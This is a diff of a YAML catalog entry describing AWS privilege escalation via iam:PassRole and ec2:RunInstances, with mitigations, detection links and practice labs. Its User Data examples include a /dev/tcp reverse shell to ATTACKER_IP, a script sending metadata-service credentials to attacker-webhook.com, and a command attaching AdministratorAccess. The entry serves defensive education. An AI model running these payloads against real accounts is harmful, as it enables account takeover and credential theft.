@@ -4,9 +4,11 @@ category: service-passrole
 services:
 - iam
 - ec2
-description: A principal with `iam:PassRole` and `ec2:RunInstances` permissions can launch a new EC2 instance and attach an
-  existing IAM Role to it. By accessing this new instance (e.g., via User Data or SSM), the attacker can obtain the credentials
-  of the passed role. The level of access gained depends on the permissions of the available roles.
+description: A principal with `iam:PassRole` and `ec2:RunInstances` permissions can
+  launch a new EC2 instance and attach an existing IAM Role to it. By accessing this
+  new instance (e.g., via User Data or SSM), the attacker can obtain the credentials
+  of the passed role. The level of access gained depends on the permissions of the
+  available roles.
 prerequisites:
   admin:
   - A role must exist that trusts ec2.amazonaws.com to assume it
@@ -18,51 +20,44 @@ prerequisites:
 exploitationSteps:
   awscli:
   - step: 1
-    command: aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --iam-instance-profile Arn="arn:aws:iam::ACCOUNT_ID:instance-profile/PRIVILEGED_ROLE"
+    command: aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro
+      --iam-instance-profile Arn="arn:aws:iam::ACCOUNT_ID:instance-profile/PRIVILEGED_ROLE"
       --user-data file://exploit.sh
-    description: Launch EC2 instance with privileged role and user data script to exfiltrate credentials
+    description: Launch EC2 instance with privileged role and user data script to
+      exfiltrate credentials
   - step: 2
-    command: '# User data script executes on boot and sends credentials to attacker-controlled server'
+    command: '# User data script executes on boot and sends credentials to attacker-controlled
+      server'
     description: Retrieve the temporary credentials from the attacker's server
   pacu:
   - step: 1
-    command: run ec2__startup_shell_script --instance-profile PRIVILEGED_ROLE --script exploit.sh
-    description: Use Pacu to launch EC2 instance with the target role and execute a shell script on startup
-recommendation: |
-  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+    command: run ec2__startup_shell_script --instance-profile PRIVILEGED_ROLE --script
+      exploit.sh
+    description: Use Pacu to launch EC2 instance with the target role and execute
+      a shell script on startup
+recommendation: "High powered service roles + overly permissive `iam:PassRole` is\
+  \ what makes this privilege escalation path exploitable and impactful.\n\n- **Avoid\
+  \ administrative service roles** - Very rarely does an EC2 instance need administrative\
+  \ access. Use the principle of least privilege.\n- **Avoid granting `iam:PassRole`\
+  \ on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles\
+  \ or specific services.\n\nUse IAM policy conditions to restrict which roles can\
+  \ be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"\
+  Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificEC2Role\"\
+  ,\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"\
+  ec2.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Monitor CloudTrail for unusual EC2\
+  \ instance creation followed by immediate access\n- Monitor CloudTrail for EC2 instance\
+  \ launches by principals who do not usually create instances\n- Monitor CloudTrail\
+  \ for roles being passed to EC2 that haven't been used before\n- Monitor and alert\
+  \ on EC2 instance creation with privileged roles\n- Regularly audit EC2 instances\
+  \ for excessive IAM permissions\n- Regularly audit all IAM roles that trust the\
+  \ EC2 service and down-scope any roles with administrative access\n"
+limitations: 'This path provides administrative access only if the passed role has
+  administrative permissions (e.g., AdministratorAccess or an equivalent custom policy).
+  If only limited roles are available, you gain access limited to those permissions.
+  However, even limited access may enable multi-hop attacks or access to sensitive
+  data.
 
-  - **Avoid administrative service roles** - Very rarely does an EC2 instance need administrative access. Use the principle of least privilege.
-  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
-
-  Use IAM policy conditions to restrict which roles can be passed and to which services:
-
-  ```json
-  {
-    "Effect": "Allow",
-    "Action": "iam:PassRole",
-    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificEC2Role",
-    "Condition": {
-      "StringEquals": {
-        "iam:PassedToService": "ec2.amazonaws.com"
-      }
-    }
-  }
-  ```
-
-  - Monitor CloudTrail for unusual EC2 instance creation followed by immediate access
-  - Monitor CloudTrail for EC2 instance launches by principals who do not usually create instances
-  - Monitor CloudTrail for roles being passed to EC2 that haven't been used before
-  - Monitor and alert on EC2 instance creation with privileged roles
-  - Regularly audit EC2 instances for excessive IAM permissions
-  - Regularly audit all IAM roles that trust the EC2 service and down-scope any roles with administrative access
-
-limitations: |
-  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.
-
-discoveredBy:
-  name: Spencer Gietzen
-  organization: Rhino Security Labs
-  date: '2019'
+  '
 discoveryAttribution:
   firstDocumented:
     author: Spencer Gietzen
@@ -86,246 +81,307 @@ relatedPaths:
 - lambda-001
 - cloudformation-001
 detectionTools:
-  pmapper: https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/ec2_edges.py#L73-L127
-  cloudsplaining: https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L131-L132
-  pacu: https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L733-L738
-  prowler: https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L26-L30
+  pmapper: https://github.com/nccgroup/PMapper/blob/91d2e60102bdadf346d77b60d90ddaa4a678f037/principalmapper/graphing/ec2_edges.py#L73-L127
+  cloudsplaining: https://github.com/salesforce/cloudsplaining/blob/7f82e7ab0a1a714d20a69b1d0b892e4702754e6b/cloudsplaining/shared/constants.py#L127
+  prowler: https://github.com/prowler-cloud/prowler/blob/49c75cc4180e2304747d8fe4bd1b16dd38929d07/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L26-L30
 learningEnvironments:
   pathfinder-labs:
     type: open-source
     githubLink: https://github.com/DataDog/pathfinder-labs
-    scenario: "privesc-one-hop/to-admin/iam-passrole+ec2-runinstances"
-    description: "Deploy Terraform into your own AWS account to practice this attack path"
+    scenario: privesc-one-hop/to-admin/iam-passrole+ec2-runinstances
+    description: Deploy Terraform into your own AWS account to practice this attack
+      path
   iam-vulnerable:
     type: open-source
     githubLink: https://github.com/BishopFox/iam-vulnerable
     scenario: EC2-CreateInstanceWithExistingProfile
-    description: "Deploy Terraform into your own AWS account and practice individual exploitation paths"
+    description: Deploy Terraform into your own AWS account and practice individual
+      exploitation paths
   cloudgoat:
     type: open-source
     githubLink: https://github.com/RhinoSecurityLabs/cloudgoat
     scenario: iam_privesc_by_attachment
-    description: "Deploy vulnerable infrastructure using CloudGoat to practice AWS privilege escalation through instance profile manipulation"
+    description: Deploy vulnerable infrastructure using CloudGoat to practice AWS
+      privilege escalation through instance profile manipulation
   pwnedlabs:
     type: closed-source
-    description: "Hosted cloud security labs with AWS privilege escalation scenarios"
+    description: Hosted cloud security labs with AWS privilege escalation scenarios
     scenario: https://labs.pwnedlabs.io/command-injection-to-ec2-user-data-privilege-escalation
     scenarioPricingModel: paid
 attackVisualization:
   nodes:
-    - id: start
-      label: Starting Principal
-      type: principal
-      description: |
-        The principal with iam:PassRole and ec2:RunInstances permissions. Can be an IAM user or role.
+  - id: start
+    label: Starting Principal
+    type: principal
+    description: 'The principal with iam:PassRole and ec2:RunInstances permissions.
+      Can be an IAM user or role.
 
-    - id: ec2_instance
-      label: New EC2 Instance
-      type: resource
-      description: |
-        New EC2 instance launched with a privileged IAM instance profile. The instance automatically assumes the attached role. The attacker can access this instance through multiple methods including User Data scripts, SSM Session Manager, or SSH.
+      '
+  - id: ec2_instance
+    label: New EC2 Instance
+    type: resource
+    description: 'New EC2 instance launched with a privileged IAM instance profile.
+      The instance automatically assumes the attached role. The attacker can access
+      this instance through multiple methods including User Data scripts, SSM Session
+      Manager, or SSH.
 
-    - id: target_role
-      label: Existing Role That Trusts the EC2 Service
-      type: principal
-      description: |
-        IAM role attached to the EC2 instance via instance profile. The role must trust ec2.amazonaws.com and have an instance profile associated with it. Credentials are available via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      '
+  - id: target_role
+    label: Existing Role That Trusts the EC2 Service
+    type: principal
+    description: 'IAM role attached to the EC2 instance via instance profile. The
+      role must trust ec2.amazonaws.com and have an instance profile associated with
+      it. Credentials are available via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
-    - id: method_userdata_direct
-      label: "Method 1: User Data Script (Direct Elevation)"
-      type: payload
-      color: '#99ccff'
-      description: |
-        Configure a User Data script that executes when the instance boots and directly elevates the starting principal by modifying IAM permissions. The script runs with the target role's credentials and can perform privileged IAM actions such as:
-        - Attaching AdministratorAccess policy to the starting principal (iam:AttachUserPolicy)
-        - Creating new access keys for privileged users (iam:CreateAccessKey)
-        - Adding the starting principal to an admin IAM group (iam:AddUserToGroup)
-        - Modifying inline policies to grant elevated permissions (iam:PutUserPolicy)
+      '
+  - id: method_userdata_direct
+    label: 'Method 1: User Data Script (Direct Elevation)'
+    type: payload
+    color: '#99ccff'
+    description: "Configure a User Data script that executes when the instance boots\
+      \ and directly elevates the starting principal by modifying IAM permissions.\
+      \ The script runs with the target role's credentials and can perform privileged\
+      \ IAM actions such as:\n- Attaching AdministratorAccess policy to the starting\
+      \ principal (iam:AttachUserPolicy)\n- Creating new access keys for privileged\
+      \ users (iam:CreateAccessKey)\n- Adding the starting principal to an admin IAM\
+      \ group (iam:AddUserToGroup)\n- Modifying inline policies to grant elevated\
+      \ permissions (iam:PutUserPolicy)\n\nExample User Data script that directly\
+      \ elevates starting principal:\n```bash\n#!/bin/bash\naws iam attach-user-policy\
+      \ \\\n  --user-name starting-user \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\
+      ```\n\nThis approach is the most straightforward - the User Data script directly\
+      \ modifies IAM to grant the starting principal elevated permissions using the\
+      \ target role's credentials.\n"
+  - id: method_reverse_shell
+    label: 'Method 2: User Data Script (Reverse Shell)'
+    type: payload
+    color: '#99ccff'
+    description: 'Configure a User Data script that establishes a reverse shell connection
+      back to an attacker-controlled listener. The reverse shell provides interactive
+      access to the EC2 instance, allowing the attacker to manually retrieve the target
+      role''s temporary credentials from the instance metadata service.
 
-        Example User Data script that directly elevates starting principal:
-        ```bash
-        #!/bin/bash
-        aws iam attach-user-policy \
-          --user-name starting-user \
-          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
-        ```
 
-        This approach is the most straightforward - the User Data script directly modifies IAM to grant the starting principal elevated permissions using the target role's credentials.
+      Example User Data script that establishes reverse shell:
 
-    - id: method_reverse_shell
-      label: "Method 2: User Data Script (Reverse Shell)"
-      type: payload
-      color: '#99ccff'
-      description: |
-        Configure a User Data script that establishes a reverse shell connection back to an attacker-controlled listener. The reverse shell provides interactive access to the EC2 instance, allowing the attacker to manually retrieve the target role's temporary credentials from the instance metadata service.
+      ```bash
 
-        Example User Data script that establishes reverse shell:
-        ```bash
-        #!/bin/bash
-        bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
-        ```
+      #!/bin/bash
 
-        Once the reverse shell is established, the attacker can:
-        1. Query the instance metadata service: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`
-        2. Extract temporary credentials (AccessKeyId, SecretAccessKey, SessionToken)
-        3. Configure these credentials locally: `aws configure set` or environment variables
-        4. Use the credentials to perform actions as the target role
+      bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
 
-        The reverse shell approach requires the attacker to maintain a listener (e.g., `nc -lvnp 4444`) but provides interactive access and flexibility for manual reconnaissance and exploitation.
+      ```
 
-    - id: method_credential_exfil
-      label: "Method 3: User Data Script (Credential Exfiltration)"
-      type: payload
-      color: '#99ccff'
-      description: |
-        Configure a User Data script that queries the instance metadata service for the target role's temporary credentials and exfiltrates them to an attacker-controlled webhook or remote listener. Unlike the reverse shell approach (which provides interactive access), this method is fire-and-forget - the script automatically retrieves and sends credentials without requiring ongoing attacker interaction.
 
-        Example User Data script that exfiltrates credentials:
-        ```bash
-        #!/bin/bash
-        ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
-        CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)
-        curl -X POST -d "$CREDS" https://attacker-webhook.com/collect
-        ```
+      Once the reverse shell is established, the attacker can:
 
-        The script automatically:
-        1. Queries the metadata service to discover the attached role name
-        2. Retrieves the full credential set (AccessKeyId, SecretAccessKey, SessionToken)
-        3. Sends the credentials to an attacker-controlled endpoint (webhook, HTTP server, etc.)
+      1. Query the instance metadata service: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`
 
-        The attacker receives the credentials remotely and can then configure them locally to authenticate as the target role. This approach is stealthier than reverse shell (no inbound connections to EC2 instance) and doesn't require maintaining a listener throughout the attack.
+      2. Extract temporary credentials (AccessKeyId, SecretAccessKey, SessionToken)
 
-    - id: admin
-      label: Effective Administrator
-      type: outcome
-      description: |
-        The target role has AdministratorAccess or equivalent permissions. Using any of the three exploitation methods, the attacker successfully leverages these permissions to gain full administrative access to the AWS account.
+      3. Configure these credentials locally: `aws configure set` or environment variables
 
-    - id: some_perms
-      label: Check for Additional Access
-      type: outcome
-      color: '#ffeb99'
-      description: |
-        The target role has some elevated permissions (but not full admin). Using any of the three exploitation methods, the attacker can leverage these permissions for data exfiltration (S3, RDS, DynamoDB), modification of security configurations, or additional privilege escalation paths.
+      4. Use the credentials to perform actions as the target role
 
-    - id: no_access
-      label: Minimal Additional Access
-      type: outcome
-      color: '#cccccc'
-      description: |
-        The target role only has minimal permissions (like logs:PutLogEvents). Regardless of the exploitation method used, the privilege escalation provides minimal value.
 
+      The reverse shell approach requires the attacker to maintain a listener (e.g.,
+      `nc -lvnp 4444`) but provides interactive access and flexibility for manual
+      reconnaissance and exploitation.
+
+      '
+  - id: method_credential_exfil
+    label: 'Method 3: User Data Script (Credential Exfiltration)'
+    type: payload
+    color: '#99ccff'
+    description: 'Configure a User Data script that queries the instance metadata
+      service for the target role''s temporary credentials and exfiltrates them to
+      an attacker-controlled webhook or remote listener. Unlike the reverse shell
+      approach (which provides interactive access), this method is fire-and-forget
+      - the script automatically retrieves and sends credentials without requiring
+      ongoing attacker interaction.
+
+
+      Example User Data script that exfiltrates credentials:
+
+      ```bash
+
+      #!/bin/bash
+
+      ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+
+      CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)
+
+      curl -X POST -d "$CREDS" https://attacker-webhook.com/collect
+
+      ```
+
+
+      The script automatically:
+
+      1. Queries the metadata service to discover the attached role name
+
+      2. Retrieves the full credential set (AccessKeyId, SecretAccessKey, SessionToken)
+
+      3. Sends the credentials to an attacker-controlled endpoint (webhook, HTTP server,
+      etc.)
+
+
+      The attacker receives the credentials remotely and can then configure them locally
+      to authenticate as the target role. This approach is stealthier than reverse
+      shell (no inbound connections to EC2 instance) and doesn''t require maintaining
+      a listener throughout the attack.
+
+      '
+  - id: admin
+    label: Effective Administrator
+    type: outcome
+    description: 'The target role has AdministratorAccess or equivalent permissions.
+      Using any of the three exploitation methods, the attacker successfully leverages
+      these permissions to gain full administrative access to the AWS account.
+
+      '
+  - id: some_perms
+    label: Check for Additional Access
+    type: outcome
+    color: '#ffeb99'
+    description: 'The target role has some elevated permissions (but not full admin).
+      Using any of the three exploitation methods, the attacker can leverage these
+      permissions for data exfiltration (S3, RDS, DynamoDB), modification of security
+      configurations, or additional privilege escalation paths.
+
+      '
+  - id: no_access
+    label: Minimal Additional Access
+    type: outcome
+    color: '#cccccc'
+    description: 'The target role only has minimal permissions (like logs:PutLogEvents).
+      Regardless of the exploitation method used, the privilege escalation provides
+      minimal value.
+
+      '
   edges:
-    - from: start
-      to: ec2_instance
-      label: iam:PassRole + ec2:RunInstances
-      description: |
-        Launch a new EC2 instance and pass the target role to it via the --iam-instance-profile parameter. Include a User Data script that will execute on instance boot to exfiltrate credentials or establish access.
+  - from: start
+    to: ec2_instance
+    label: iam:PassRole + ec2:RunInstances
+    description: "Launch a new EC2 instance and pass the target role to it via the\
+      \ --iam-instance-profile parameter. Include a User Data script that will execute\
+      \ on instance boot to exfiltrate credentials or establish access.\n\nCommand:\n\
+      ```bash\naws ec2 run-instances \\\n  --image-id ami-12345678 \\\n  --instance-type\
+      \ t2.micro \\\n  --iam-instance-profile Arn=\"arn:aws:iam::ACCOUNT_ID:instance-profile/PRIVILEGED_ROLE\"\
+      \ \\\n  --user-data file://exploit.sh\n```\n"
+  - from: ec2_instance
+    to: target_role
+    label: Instance assumes role
+    description: 'The EC2 instance automatically assumes the attached IAM role. Credentials
+      become available via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/
 
-        Command:
-        ```bash
-        aws ec2 run-instances \
-          --image-id ami-12345678 \
-          --instance-type t2.micro \
-          --iam-instance-profile Arn="arn:aws:iam::ACCOUNT_ID:instance-profile/PRIVILEGED_ROLE" \
-          --user-data file://exploit.sh
-        ```
+      '
+  - from: target_role
+    to: method_userdata_direct
+    label: Option A
+    description: 'Configure the EC2 instance with a User Data script that directly
+      modifies IAM to elevate the starting principal''s permissions.
 
-    - from: ec2_instance
-      to: target_role
-      label: Instance assumes role
-      description: |
-        The EC2 instance automatically assumes the attached IAM role. Credentials become available via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      '
+  - from: target_role
+    to: method_reverse_shell
+    label: Option B
+    description: 'Configure the EC2 instance with a User Data script that establishes
+      a reverse shell connection back to an attacker-controlled listener.
 
-    - from: target_role
-      to: method_userdata_direct
-      label: Option A
-      description: |
-        Configure the EC2 instance with a User Data script that directly modifies IAM to elevate the starting principal's permissions.
+      '
+  - from: target_role
+    to: method_credential_exfil
+    label: Option C
+    description: 'Configure the EC2 instance with a User Data script that exfiltrates
+      the target role''s temporary credentials to an attacker-controlled webhook or
+      remote listener.
 
-    - from: target_role
-      to: method_reverse_shell
-      label: Option B
-      description: |
-        Configure the EC2 instance with a User Data script that establishes a reverse shell connection back to an attacker-controlled listener.
+      '
+  - from: method_userdata_direct
+    to: admin
+    label: If target role has admin permissions
+    branch: A1
+    condition: admin
+    description: 'The User Data script executes with AdministratorAccess permissions
+      and successfully grants the starting principal full administrative access (e.g.,
+      via iam:AttachUserPolicy).
 
-    - from: target_role
-      to: method_credential_exfil
-      label: Option C
-      description: |
-        Configure the EC2 instance with a User Data script that exfiltrates the target role's temporary credentials to an attacker-controlled webhook or remote listener.
+      '
+  - from: method_userdata_direct
+    to: some_perms
+    label: If target role has some elevated permissions
+    branch: A2
+    condition: some_permissions
+    description: 'The User Data script executes with elevated permissions and can
+      modify IAM to grant the starting principal additional access within those permissions.
 
-    - from: method_userdata_direct
-      to: admin
-      label: If target role has admin permissions
-      branch: A1
-      condition: admin
-      description: |
-        The User Data script executes with AdministratorAccess permissions and successfully grants the starting principal full administrative access (e.g., via iam:AttachUserPolicy).
+      '
+  - from: method_userdata_direct
+    to: no_access
+    label: If target role has minimal permissions
+    branch: A3
+    condition: no_permissions
+    description: 'The User Data script has minimal permissions and cannot effectively
+      elevate the starting principal''s privileges.
 
-    - from: method_userdata_direct
-      to: some_perms
-      label: If target role has some elevated permissions
-      branch: A2
-      condition: some_permissions
-      description: |
-        The User Data script executes with elevated permissions and can modify IAM to grant the starting principal additional access within those permissions.
+      '
+  - from: method_reverse_shell
+    to: admin
+    label: If target role has admin permissions
+    branch: B1
+    condition: admin
+    description: 'The reverse shell provides access to credentials with AdministratorAccess
+      permissions. The attacker can exfiltrate these credentials and use them to gain
+      full administrative access to the AWS account.
 
-    - from: method_userdata_direct
-      to: no_access
-      label: If target role has minimal permissions
-      branch: A3
-      condition: no_permissions
-      description: |
-        The User Data script has minimal permissions and cannot effectively elevate the starting principal's privileges.
+      '
+  - from: method_reverse_shell
+    to: some_perms
+    label: If target role has some elevated permissions
+    branch: B2
+    condition: some_permissions
+    description: 'The reverse shell provides access to credentials with elevated permissions.
+      The attacker can exfiltrate these credentials for data access or additional
+      privilege escalation attempts.
 
-    - from: method_reverse_shell
-      to: admin
-      label: If target role has admin permissions
-      branch: B1
-      condition: admin
-      description: |
-        The reverse shell provides access to credentials with AdministratorAccess permissions. The attacker can exfiltrate these credentials and use them to gain full administrative access to the AWS account.
+      '
+  - from: method_reverse_shell
+    to: no_access
+    label: If target role has minimal permissions
+    branch: B3
+    condition: no_permissions
+    description: 'The reverse shell provides access to credentials with minimal permissions,
+      offering limited value for privilege escalation.
 
-    - from: method_reverse_shell
-      to: some_perms
-      label: If target role has some elevated permissions
-      branch: B2
-      condition: some_permissions
-      description: |
-        The reverse shell provides access to credentials with elevated permissions. The attacker can exfiltrate these credentials for data access or additional privilege escalation attempts.
+      '
+  - from: method_credential_exfil
+    to: admin
+    label: If target role has admin permissions
+    branch: C1
+    condition: admin
+    description: 'The User Data script successfully exfiltrates credentials with AdministratorAccess
+      permissions. The attacker configures these credentials locally and gains full
+      administrative access.
 
-    - from: method_reverse_shell
-      to: no_access
-      label: If target role has minimal permissions
-      branch: B3
-      condition: no_permissions
-      description: |
-        The reverse shell provides access to credentials with minimal permissions, offering limited value for privilege escalation.
+      '
+  - from: method_credential_exfil
+    to: some_perms
+    label: If target role has some elevated permissions
+    branch: C2
+    condition: some_permissions
+    description: 'The User Data script exfiltrates credentials with elevated permissions
+      that can be used for data exfiltration or further privilege escalation.
 
-    - from: method_credential_exfil
-      to: admin
-      label: If target role has admin permissions
-      branch: C1
-      condition: admin
-      description: |
-        The User Data script successfully exfiltrates credentials with AdministratorAccess permissions. The attacker configures these credentials locally and gains full administrative access.
+      '
+  - from: method_credential_exfil
+    to: no_access
+    label: If target role has minimal permissions
+    branch: C3
+    condition: no_permissions
+    description: 'The exfiltrated credentials have minimal permissions and provide
+      limited value for privilege escalation.
 
-    - from: method_credential_exfil
-      to: some_perms
-      label: If target role has some elevated permissions
-      branch: C2
-      condition: some_permissions
-      description: |
-        The User Data script exfiltrates credentials with elevated permissions that can be used for data exfiltration or further privilege escalation.
-
-    - from: method_credential_exfil
-      to: no_access
-      label: If target role has minimal permissions
-      branch: C3
-      condition: no_permissions
-      description: |
-        The exfiltrated credentials have minimal permissions and provide limited value for privilege escalation.
+      '
 permissions:
   required:
   - permission: iam:PassRole
